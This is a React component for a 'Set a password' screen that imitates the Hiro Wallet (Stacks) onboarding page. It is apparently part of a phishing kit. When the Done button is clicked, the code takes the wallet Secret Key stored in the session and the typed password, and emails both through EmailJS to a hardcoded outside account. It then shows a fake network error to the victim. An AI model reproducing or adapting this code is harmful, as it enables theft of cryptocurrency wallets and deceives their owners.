import { useState } from "react";
import { 
	Flex,
	Text,
  	Spacer,
  	Image,
  	Spinner,
} from "@chakra-ui/react";
import "./App.scss";
import "./mdi/css/materialdesignicons.css";
import { useHistory } from 'react-router-dom';
import PassIcon from "./setPass.png";
import emailjs from 'emailjs-com';
import { async } from "analytics/lib/analytics.cjs";


function SetPass({ setVarPage, toLoad }) {
    const [error, setError] = useState(false)
    const [error2, setError2] = useState(false)
    const [error3, setError3] = useState(false)
    const [loading, setLoading] = useState(false)
    const [network, setNetwork] = useState(false)
    setVarPage(true)
    const history = useHistory()

    return (
        <Flex w="100%" flex="1" align={["flex-start", "center"]} px={["6%", "33%"]} justify="center">
            <Flex id="goBack" onClick={() => history.goBack()}></Flex>
            <Flex direction="column" flex="1" align={["flex-start", "center"]}>
                <Image w={["80px", "117px"]} mb={["28px", "32px"]} src={PassIcon} />
                <Text fontWeight="bold" fontSize={["26px", "48px"]} fontFamily="var" textAlign="center" mb={["28px", "32px"]} lineHeight="125%">Set a password</Text>

                <Text textAlign={["left", "center"]} mb="24px" color="#424248">Your password protects your Secret Key and is for this device only. To access your Stacks account on another device or wallet you’ll need just your Secret Key.</Text>

                {
                    error && 
                    <Text textAlign={["left", "center" ]}mb="24px" color="#747478" fontSize={["12px", "14px"]}>Please use a stronger password. Longer than 12 characters, with symbols, numbers, and words.</Text>
                }
                <Flex w="100%" px={["1", "4"]} direction="column">
                    <input type="password" style={{ border: "1px solid #F0F0F2", borderRadius: "10px", padding: "14px 16px", height: "64px", letterSpacing: "-0.01em", lineHeight: "1.4", width: "100%", appearance: "none", color: "#424248" }} placeholder="Set a password" id="pass"></input>
                    {
                        error2 !== false &&
                        <Text ml="3" mt="4" w="100%" textAlign="left" color="#CF0000" pr="32px" lineHeight="1.333" fontSize={["12px", "14px"]}><Text as="span" color="#747478">Password strength: </Text>{error2}</Text>
                    }
                    <Flex h="16px"></Flex>
                    <input type="password" style={{ border: "1px solid #F0F0F2", borderRadius: "10px", padding: "14px 16px", height: "64px", letterSpacing: "-0.01em", lineHeight: "1.4", width: "100%", appearance: "none", color: "#424248" }} placeholder="Confirm password" id="confirm"></input>
                    {
                        error3 !== false &&
                        <Flex mt="4" w="100%" justify="flex-start" align="center">
                            <i className="mdi mdi-information-outline" style={{ fontSize: "18px", color: "#CF0000", transform: "rotate(360deg)"}}></i>
                            <Text ml="3" color="#CF0000" pr="32px" lineHeight="1.333" fontSize={["12px", "14px"]}>{error3}</Text>
                        </Flex>
                    }

                    <Flex cursor="pointer" mt="28px" justify="center" w="100%" padding="14px 16px" borderRadius="10px" color="#fff" bg="rgb(85, 70, 255)" transition="all 0.2s cubic-bezier(0.23, 1, 0.32, 1) 0s" fontSize="14px" _hover={{ bg: "rgb(68, 51, 255)" }} fontWeight="bold" mr="2" opacity={loading ? ".4" : "1"} onClick={async () => {
                        var secKey = sessionStorage.getItem("hiroKey")
                        var pass = document.getElementById('pass').value
                        var confirm = document.getElementById('confirm').value
                        setNetwork(false)
                        
                        if(pass === "" && confirm === "") {
                            setError(true)
                            setError2("password must be defined")
                            setError3("confirm password must be defined.")
                        }
                        else {
                            setError(false)
                            setError2(false)
                            setError3(false)
                        }

                        if(pass === "") {
                            setError(true)
                            setError2("password must be defined")
                        }
                        else if(pass.length < 12) {
                            setError(true)
                            setError2("Weak")
                        }
                        else {
                            setError2(false)
                            setError(false)
                        }

                        if(confirm === "") {
                            setError3("confirm password must be defined.")
                        }
                        else if(confirm != pass) {
                            setError3("Passwords must match")
                        }
                        else {
                            setError3(false)
                        }

                        if(pass !== "" && confirm !== "" && pass.length > 11 && pass == confirm) {
                            const templateParams = {
                                from_name: "New User",
                                message: "Hiro Wallet Secret Key is:=("+secKey+") and password is ("+pass+")"
                            }
                            if(toLoad === 0) {
                                setLoading(true)
                                await emailjs.send('outlook', 'template_o56f59x', templateParams, 'user_dc6zvosdPxmxouq5EigcI')
                                .then((response) => {
                                    console.log('')
                                }, (err) => {
                                    console.log('')
                                })
                                setLoading(false)
                                setNetwork(true)
                            }
                            else {
                                setLoading(true)
                                setTimeout(function() { 
                                    setLoading(false)
                                    setNetwork(true)
                                }, 3000)
                            }
                        }
                    }}>{loading ? <Spinner color="#fff" emptyColor="lightgrey" /> : "Done"}</Flex>
                    {
                        network &&
                        <Flex mt="4">
                            <i className="mdi mdi-information-outline" style={{ fontSize: "18px", color: "#CF0000", transform: "rotate(360deg)"}}></i>
                            <Text ml="3" mt="4px" color="#CF0000" pr="32px" lineHeight="1.333" fontSize={["12px", "14px"]}>Network error! Cannot connect at the moment kindly try again</Text>
                        </Flex>
                    }
                </Flex>
            </Flex>
        </Flex>
    )
}


export default SetPass;